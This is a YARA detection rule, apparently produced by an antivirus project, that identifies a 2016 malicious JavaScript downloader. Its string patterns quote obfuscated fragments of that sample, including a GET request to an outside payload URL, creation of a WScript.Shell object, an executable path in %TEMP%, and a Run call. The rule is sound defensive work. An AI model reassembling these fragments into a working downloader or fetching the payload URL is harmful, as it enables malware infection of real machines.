rule sig_20160330_8ad6cff4c0890571979497da7f72e773 {
  meta:
    description = "datamaliciousorder - file 20160330_8ad6cff4c0890571979497da7f72e773.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "73fb7ea6803b8276f4ccb2e202ac63c629a17e45d95902648e25acb4463b3104"

  strings:
    $s1  = "_QI[_N](\"GET\", \"http://spasupplyexpert.com/b3osa\", false);" fullword ascii
    $s2  = "var _KR = function _TR() {return WScript[_HA](\"WScript\"+\".Shell\");}(), _X0 = 11;" fullword ascii
    $s3  = "function _UA(_K, _FV){_PP = _PP * 1; return _K - _FV;};" fullword ascii
    $s4  = "if (_QI[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _MT() {return _KR[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"W65NPYfherNnNz.ex\" + \"e\";};" fullword ascii
    $s6  = "function _ZB(){return _QU + \"\";};" fullword ascii
    $s7  = "function _EG(_TU){_KR[\"Run\"](_TU, _PP, _PP);};" fullword ascii
    $s8  = "function _A() {return ((_S == true) && (_S == _MA)) ? 1 : _PP;};" fullword ascii
    $s9  = "function _Y(){return 22;};" fullword ascii
    $s10 = "function _JS()" fullword ascii
    $s11 = "var _LT = new this[\"Date\"]();" fullword ascii
    $s12 = " while (_Z){" fullword ascii
    $s13 = "function _KC(_HJ) {var _QM = (1, 2, 3, 4, 5, _HJ); return _QM;};" fullword ascii
    $s14 = "function _J(){return _HA;};" fullword ascii
    $s15 = "return _UA(_ZD, _WX);" fullword ascii
    $s16 = "var _S = false;" fullword ascii
    $s17 = "_S = true; " fullword ascii
    $s18 = "_MA = true; " fullword ascii
    $s19 = "var _DW = false;" fullword ascii
    $s20 = "var _MA = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}